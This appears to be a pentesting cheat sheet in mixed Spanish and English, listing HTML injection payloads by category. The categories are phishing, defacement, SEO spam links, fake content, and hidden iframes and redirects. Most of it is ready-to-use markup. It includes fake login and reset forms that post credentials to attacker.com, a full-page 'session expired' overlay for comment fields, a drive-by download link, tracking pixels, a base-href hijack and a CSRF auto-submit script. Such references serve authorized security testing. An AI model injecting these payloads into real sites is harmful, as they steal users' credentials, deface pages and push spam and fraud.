---
aliases:
  - HTML Injection Phishing
  - HTML Defacement
  - HTML SEO
tags:
  - type/cheatsheet
  - vuln/html-injection
  - technique/initial-access
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Vectores Comunes

***

## Phishing via Fake Form / Login

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Fake login form | `<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>` | Captures creds. |
| Fake reset password | `<form action="//attacker"><input name="email"></form>` | Same UX. |
| Form override existing | Insert form encima del legit (CSS positioning) | Stealth. |
| Logout-then-login pattern | `<a href="/logout">Click</a>` triggers logout, atacante's domain takes over | Multi-step. |
| Embedded login overlay | `<div style="position:fixed;top:0;...">FAKE LOGIN</div>` | Visual layer. |
| Action attribute external | `<form action="https://evil.com/log">` con stolen UI | Standard. |
| HTTPS fake form on HTTP page | Mixed content sometimes | Edge. |
| Dynamic form via SVG | `<svg><foreignObject>...</foreignObject></svg>` | If SVG allowed. |
| Combine con CSS | Hide app UI con CSS, show fake | Custom phishing. |
| Method override | `<form method="POST"><input name="_method" value="DELETE">...</form>` | Combine CSRF. |
| File upload phishing | `<input type="file">` UI + sumitted to atacante | Captura archivos. |
^htmli-vector-phishing

### Phishing PoC en comment field

```html
<style>
  body { display: none; }
</style>
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;">
  <h1>Session expired. Please re-login:</h1>
  <form action="https://attacker.com/log" method="POST">
    <input name="email" placeholder="Email" /><br>
    <input name="password" type="password" placeholder="Password" /><br>
    <button>Login</button>
  </form>
</div>
```

Si commento aparece en pages publicas, todos los users ven fake login.

___

## Defacement / Page Modification

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Insert offensive content | `<h1 style="color:red">DEFACED</h1>` | Standard defacement. |
| Replace logo | `<img src="https://attacker/troll.png" style="position:absolute;top:0;...">` | Visual replace. |
| Insert ad / promo | `<div style="...">Click here for FREE BITCOIN!</div>` | Monetization vector. |
| Hide legit content | `<style>.legit-content { display:none; }</style>` | CSS hide. |
| Inject background music | `<audio src="evil.mp3" autoplay loop>` | Annoyance. |
| Inject video | `<video src="evil.mp4" autoplay>` | Same. |
| Inject offensive iframe | `<iframe src="https://evil.com" style="width:100%;height:100%;">` | Full page replace. |
| Style sheet injection | `<style>* { color: red; }</style>` | Visual chaos. |
| Animation defacement | CSS animations | Distracting. |
| Multi-element insert | Múltiples tags simultáneos | Bulk defacement. |
| Persistent defacement | Stored injection visible always | High impact. |
| Per-region defacement | Use language detection a serve diferente | Targeted. |
^htmli-vector-deface

___

## SEO / Social Engineering Links

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Inject SEO spam links | `<a href="https://spam.com">Buy Pills</a>` × N | Search engine ranking abuse. |
| Hidden links | `<a href="..." style="display:none;">x</a>` | Invisible to user pero crawled. |
| Link bait phishing | `<a href="https://target.com.evil.com">Login</a>` | Lookalike domain. |
| Fake reset link | `<a href="https://evil.com/fake-reset">Reset password</a>` | Phishing destination. |
| Link rel SEO abuse | `<link rel="canonical" href="https://evil.com">` | SEO redirect (if rendered head). |
| `nofollow` bypass | Insert links sin nofollow attr | Ignored by app filter. |
| Mass spam injection | Múltiples links en single field | Bulk spam. |
| Cloaked links | `<a href="https://evil.com">https://target.com</a>` | Display vs href mismatch. |
| Anchor para download | `<a href="malware.exe">click</a>` | Drive-by download. |
| Tel/mailto links | `<a href="tel:+1xxx">call us</a>` | Vishing. |
| Mixed content | Insert links to attacker en legit page | Trust transfer. |
^htmli-vector-seo

___

## Visible Content Injection

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Misleading text | `<h2>Special offer for you!</h2>` | UX confusion. |
| Fake notifications | `<div class="alert">Your account is locked!</div>` | Panic UX. |
| Counter injection | `<span style="font-size:50px">999</span>` views | Fake metrics. |
| Highlight text | `<mark>HIGHLIGHTED</mark>` | Attention. |
| Marquee | `<marquee>SPAM</marquee>` | Legacy moving text. |
| Iframe overlay | `<iframe>` con malicious | Standard. |
| Pre-formatted text | `<pre>` with ASCII art | Visual. |
| Inject error messages | `<div class="error">Account hacked, click here</div>` | Phishing UX. |
| Clickbait button | `<button onclick="...">CLAIM NOW</button>` con event (XSS) | Combine vectors. |
| Survey injection | Insert fake survey | Data harvest. |
| Comment quote injection | `<blockquote>FAKE QUOTE</blockquote>` | Attribution forgery. |
| Counterfeit reviews | `<div>5 stars - Atacante</div>` | Fraud. |
^htmli-vector-content

___

## Hidden Elements / Iframe Abuse

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Hidden iframe | `<iframe src="https://attacker" style="display:none">` | Background actions. |
| Hidden form | `<form style="display:none" action="..." onload="...">` | Auto-submit form. |
| Tracking pixel | `<img src="https://attacker/track" width="1" height="1" style="display:none">` | User tracking. |
| Clickjacking via iframe | `<iframe src="legit-action" style="opacity:0">` | UI redress. |
| 1x1 invisible iframe | `<iframe src="..." width="1" height="1">` | Invisible action. |
| CSRF via auto-submit | `<form id="x" action="legit/action">...</form><script>document.getElementById('x').submit()</script>` | XSS chain. |
| Fetch via image | `<img src="//attacker/?cookie=...">` (won't read cookies but logs Referer) | Referer leak. |
| `<base>` href hijack | `<base href="https://attacker.com/">` overrides relative URLs | All assets routed via attacker. |
| Background redirect | `<meta http-equiv="refresh" content="0;url=https://evil.com">` | Auto-redirect. |
| Hidden svg | SVG con onload event si XSS allowed | Combo. |
| `onerror` on broken img | `<img src="bad" onerror="...">` | XSS combo. |
| Conditional comments | `<!--[if IE]>...<![endif]-->` legacy IE | Edge case. |
^htmli-vector-hidden

***
